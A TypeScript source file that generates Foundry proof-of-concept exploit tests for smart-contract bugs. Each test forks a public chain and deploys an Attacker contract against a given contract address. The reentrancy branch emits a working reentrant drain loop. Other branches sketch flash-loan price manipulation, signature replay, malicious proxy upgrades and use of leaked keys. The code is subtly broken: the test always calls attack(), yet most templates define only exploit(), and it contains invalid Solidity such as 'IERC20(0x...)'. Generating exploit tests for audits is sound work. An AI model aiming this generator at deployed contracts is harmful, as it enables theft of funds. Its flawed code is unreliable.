export function generateFoundryPoC(signal: any): string {
  const name = signal.category?.replace(/[^a-zA-Z]/g, '') || 'Exploit'

  // Check if we have enough information
  const hasAddress = signal.contractAddress && signal.contractAddress !== '0x0000000000000000000000000000000000000000'
  const hasFunction = signal.functionName && signal.functionName !== 'vulnerableFunction'

  if (!hasAddress || !hasFunction) {
    return `// ============================================================
// INSUFFICIENT INFORMATION FOR AUTOMATIC PoC
// ============================================================
// To generate a working exploit, provide:
// - Contract address: ${signal.contractAddress || 'MISSING'}
// - Function name: ${signal.functionName || 'MISSING'}
// - Chain/RPC URL: ${signal.chain || 'MISSING'}
//
// Once you have these, the PoC will be generated automatically.
// ============================================================
`
  }

  const functionSignature = signal.functionParams
    ? `function ${signal.functionName}(${signal.functionParams}) external`
    : `function ${signal.functionName}() external`

  const category = signal.category || ''
  let attackLogic = ''
  let receiveLogic = ''
  let assertion = ''
  let extraImports = ''
  let extraState = ''
  let extraSetup = ''

  // ============================================================
  // CATEGORY-SPECIFIC EXPLOIT LOGIC
  // ============================================================

  if (category.includes('Reentrancy') || category.includes('reentrancy')) {
    attackLogic = `
    function attack() external {
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    receiveLogic = `
    receive() external payable {
        count++;
        if (count < 5) {
            I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
        }
    }`
    assertion = `assertGt(address(attacker).balance, attackerBalanceBefore, "Reentrancy exploit failed");`
  }

  else if (category.includes('Access Control') || category.includes('IDOR') || category.includes('Authorization')) {
    attackLogic = `
    function exploit() external {
        // Call unprotected function as attacker
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Access control bypass executed - check state changes");`
  }

  else if (category.includes('Oracle') || category.includes('Price')) {
    extraImports = `import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";`
    attackLogic = `
    function exploit() external {
        // Flash loan to manipulate price
        // Then swap for profit
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Oracle manipulation executed - check price impact");`
  }

  else if (category.includes('Signature') || category.includes('Replay')) {
    attackLogic = `
    function exploit() external {
        // Replay a valid signature
        // Use previously signed message
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Signature replay executed - check nonce/state");`
  }

  else if (category.includes('Accounting') || category.includes('Invariant')) {
    attackLogic = `
    function exploit() external {
        // Break accounting invariant
        // Exploit rounding or precision loss
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Invariant violation executed - check balances");`
  }

  else if (category.includes('Rounding') || category.includes('Precision')) {
    attackLogic = `
    function exploit() external {
        // Trigger precision loss
        // Use edge-case values
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Rounding exploit executed - check calculation results");`
  }

  else if (category.includes('Token Integration')) {
    extraImports = `import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";`
    extraState = `
    IERC20 public token;`
    extraSetup = `
        token = IERC20(0x...); // Set token address`
    attackLogic = `
    function exploit() external {
        // Use malicious token behavior
        // Or exploit non-standard ERC20
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Token integration exploit executed - check balances");`
  }

  else if (category.includes('Unsafe External Call')) {
    attackLogic = `
    function exploit() external {
        // Trigger unsafe external call
        // Deploy malicious contract to respond
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Unsafe external call exploit executed - check state");`
  }

  else if (category.includes('Upgradeability')) {
    attackLogic = `
    function exploit() external {
        // Upgrade proxy to malicious implementation
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Upgradeability exploit executed - check implementation address");`
  }

  else if (category.includes('DeFi Economic Attack')) {
    extraImports = `import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";`
    attackLogic = `
    function exploit() external {
        // Multi-step economic attack
        // Flash loan + swap + arbitrage
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("DeFi economic attack executed - check profit");`
  }

  else if (category.includes('DoS') || category.includes('Gas')) {
    attackLogic = `
    function exploit() external {
        // Exhaust gas or trigger revert
        // Use unbounded loop or expensive operation
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("DoS exploit executed - check gas usage");`
  }

  else if (category.includes('Secrets') || category.includes('Key Exposure')) {
    attackLogic = `
    function exploit() external {
        // Use exposed private key or secret
        // Sign transaction with leaked key
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Secrets exploit executed - check unauthorized access");`
  }

  else if (category.includes('Cross-Layer') || category.includes('Cross Layer')) {
    attackLogic = `
    function exploit() external {
        // Cross-layer attack chain
        // Multiple contracts across layers
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Cross-layer exploit executed - check multi-contract state");`
  }

  else if (category.includes('Business Logic')) {
    attackLogic = `
    function exploit() external {
        // Bypass business logic checks
        // Call functions in wrong order
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("Business logic exploit executed - check state machine");`
  }

  else {
    // Generic fallback
    attackLogic = `
    function exploit() external {
        I${name}(target).${signal.functionName}(${signal.functionParams ? '/* params */' : ''});
    }`
    assertion = `console.log("${category} exploit executed - verify manually");`
  }

  // ============================================================
  // RPC URL SELECTION
  // ============================================================

  const rpcUrl = signal.chain === 'base-sepolia' 
    ? 'https://sepolia.base.org'
    : signal.chain === 'base'
    ? 'https://mainnet.base.org'
    : signal.chain === 'arbitrum'
    ? 'https://arb1.arbitrum.io/rpc'
    : signal.chain === 'optimism'
    ? 'https://mainnet.optimism.io'
    : signal.chain === 'polygon'
    ? 'https://polygon-rpc.com'
    : 'https://eth.llamarpc.com'

  // ============================================================
  // BUILD FINAL POC
  // ============================================================

  return `// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
${extraImports}

// ============================================================
// SIGNAL: ${signal.title || category.toUpperCase()}
// SEVERITY: ${signal.severity || 'MEDIUM'}
// LOCATION: ${signal.location || 'Unknown'}
// ============================================================
// ATTACK CHAIN:
// ${signal.attackChain || 'No attack chain provided'}
// ============================================================

interface I${name} {
    ${functionSignature};
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract Attacker {
    I${name} public target;
    uint256 public count;
    bool public exploited;
    ${extraState}

    constructor(address _target) {
        target = I${name}(_target);
        ${extraSetup}
    }

    ${attackLogic}

    ${receiveLogic || '// No reentrancy needed'}
}

contract ${name}ExploitTest is Test {
    address constant TARGET = ${signal.contractAddress || '0x0000000000000000000000000000000000000000'};
    
    Attacker public attacker;
    address public attackerAddr = address(0x1337);

    function setUp() public {
        string memory RPC_URL = "${rpcUrl}";
        vm.createSelectFork(RPC_URL, ${signal.blockNumber || 'latest'});

        attacker = new Attacker(TARGET);
        
        vm.deal(address(attacker), 1 ether);
        vm.deal(attackerAddr, 10 ether);
        
        vm.label(TARGET, "${name}");
        vm.label(address(attacker), "Attacker");
    }

    function testExploit() public {
        uint256 targetBalanceBefore = TARGET.balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("=== BEFORE EXPLOIT ===");
        console.log("Target balance:", targetBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);

        vm.startPrank(attackerAddr);
        attacker.attack();
        vm.stopPrank();

        uint256 targetBalanceAfter = TARGET.balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("=== AFTER EXPLOIT ===");
        console.log("Target balance:", targetBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);

        ${assertion}
    }
}
`
}
